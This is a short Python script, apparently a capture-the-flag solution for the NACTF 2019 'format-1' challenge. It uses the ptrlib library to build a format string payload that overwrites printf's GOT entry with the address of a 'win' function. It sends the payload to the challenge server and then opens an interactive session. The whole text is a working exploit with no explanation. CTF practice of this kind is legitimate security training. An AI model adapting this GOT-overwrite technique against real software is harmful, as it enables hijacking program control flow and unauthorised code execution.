from ptrlib import *

elf = ELF("./format-1")
#sock = Process("./format-1")
sock = Socket("shell.2019.nactf.com", 31560)
writes = {elf.got("printf"): elf.symbol("win")}
payload = fsb(
    pos = 4,
    writes = writes,
    bs = 1,
    bits = 32
)
sock.sendlineafter(">", payload)

sock.interactive()
